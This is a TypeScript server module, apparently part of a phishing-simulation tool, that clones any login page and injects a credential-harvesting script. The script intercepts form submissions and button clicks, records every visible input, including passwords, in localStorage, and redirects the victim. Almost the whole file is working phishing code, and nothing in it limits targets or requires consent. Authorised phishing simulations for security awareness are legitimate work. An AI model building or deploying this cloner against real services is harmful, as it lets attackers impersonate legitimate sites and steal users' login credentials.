
'use server';
/**
 * @fileOverview A server-side utility for cloning a web page for phishing simulations.
 *
 * - cloneLoginPage - Fetches a URL's HTML, injects a credential harvester script, and returns the modified content.
 * - PageClonerInput - The input type for the cloneLoginPage function.
 * - PageClonerOutput - The return type for the cloneLoginPage function.
 */

import {z} from 'zod';

const PageClonerInputSchema = z.object({
  targetUrl: z.string().url('A valid target URL is required.'),
  redirectUrl: z.string().url('A valid URL to redirect to after submission is required.'),
});
export type PageClonerInput = z.infer<typeof PageClonerInputSchema>;

const PageClonerOutputSchema = z.object({
  htmlContent: z.string().describe('The full HTML content of the generated login page.'),
});
export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;


const getHarvesterScript = (redirectUrl: string) => `
<script>
  // This is a robust capture function that can be called by multiple event listeners.
  function captureAndRedirect(formElement) {
    // Ensure we have a valid form element
    if (!(formElement instanceof HTMLFormElement)) {
      console.warn('Capture target is not a form element.');
      window.location.href = '${redirectUrl}';
      return;
    }
    
    let credentials = {};
    const inputs = formElement.querySelectorAll('input');
    
    inputs.forEach(input => {
      // Capture all input fields except for hidden ones and buttons, if they have a name and a value.
      if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.name && input.value) {
        credentials[input.name] = input.value;
      }
    });

    try {
      // Only save to localStorage if we actually captured some credentials.
      if (Object.keys(credentials).length > 0) {
        const entry = {
            ...credentials,
            timestamp: Date.now()
        };
        const storedCreds = localStorage.getItem('netra-credentials');
        const existingCreds = storedCreds ? JSON.parse(storedCreds) : [];
        const updatedCreds = [...existingCreds, entry];
        localStorage.setItem('netra-credentials', JSON.stringify(updatedCreds));
      }
    } catch (err) {
      console.error('Error saving credentials to localStorage:', err);
    }
    
    // Redirect the user to the specified URL after attempting to capture credentials.
    window.location.href = '${redirectUrl}';
  }

  // Listener for standard form submissions.
  document.addEventListener('submit', function(e) {
    e.preventDefault();
    captureAndRedirect(e.target);
  }, true);

  // Listener for clicks on buttons that might trigger a JS-based submission.
  document.addEventListener('click', function(e) {
    let target = e.target;
    // Find the button if the click was on an element inside it (like an icon).
    if (target.tagName !== 'BUTTON') {
      target = target.closest('button');
    }

    if (target && target.tagName === 'BUTTON' && (target.type === 'submit' || !target.type)) {
      const form = target.form;
      if (form) {
        // We found a button inside a form, so we'll treat this as a submission attempt.
        e.preventDefault();
        captureAndRedirect(form);
      }
    }
  }, true);
</script>
`;


export async function cloneLoginPage(input: PageClonerInput): Promise<PageClonerOutput> {
  const { targetUrl, redirectUrl } = PageClonerInputSchema.parse(input);

  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch the target URL. Status: ${response.status}`);
    }

    let html = await response.text();

    // 1. Inject <base> tag to fix relative links for CSS, images, etc.
    const url = new URL(targetUrl);
    const baseTag = `<base href="${url.origin}">`;
    html = html.replace(/(<head[^>]*>)/, `$1${baseTag}`);

    // 2. Inject the credential harvester script before the closing body tag
    const script = getHarvesterScript(redirectUrl);
    html = html.replace(/<\/body>/, `${script}</body>`);

    return {
      htmlContent: html,
    };
  } catch (error) {
    console.error('Error cloning page:', error);
    if (error instanceof Error) {
        throw new Error(`Failed to clone page: ${error.message}`);
    }
    throw new Error('An unknown error occurred during page cloning.');
  }
}
